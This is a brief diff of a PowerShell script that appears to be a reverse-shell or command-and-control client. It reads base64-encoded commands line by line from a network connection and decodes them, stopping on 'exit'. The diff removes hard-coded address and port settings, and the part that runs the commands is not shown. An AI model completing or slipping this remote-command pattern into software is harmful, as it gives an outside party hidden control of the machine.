@@ -1,6 +1,3 @@
-$address = 'localhost'
-$port = 6666
-
 try {
 	while($true) {
 		try {
@@ -19,7 +16,6 @@ try {
 	while($true) {
 		$raw = $reader.ReadLine()
 		$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($raw))
-
 		if ($cmd -eq 'exit') {
 			break
 		}
